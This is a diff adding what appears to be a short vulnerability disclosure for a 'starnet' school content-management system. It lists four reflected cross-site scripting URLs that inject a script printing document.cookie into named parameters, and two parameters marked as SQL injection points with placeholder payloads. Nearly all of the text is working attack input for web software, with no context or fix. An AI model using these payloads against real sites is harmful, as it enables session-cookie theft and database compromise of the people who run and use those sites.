@@ -1,0 +1,15 @@
+XSS:
+
+http://www.example.com/school/starnet/index.php?option=stats&amp;suboption=&#039;&quot;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+
+http://www.example.com/school/starnet/index.php?option=pagemanager&amp;suboption=newsection&amp;site=&#039;&quot;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&amp;modoption=edit&amp;module_number=&quot;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt; 
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&amp;module=&#039;&quot;&lt;/style&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+SQL Injection:
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&amp;modoption=edit&amp;module_number=[sql injection]
+
+http://www.example.com/school/starnet/index.php?option=modulemanager&amp;module=[sql injection]
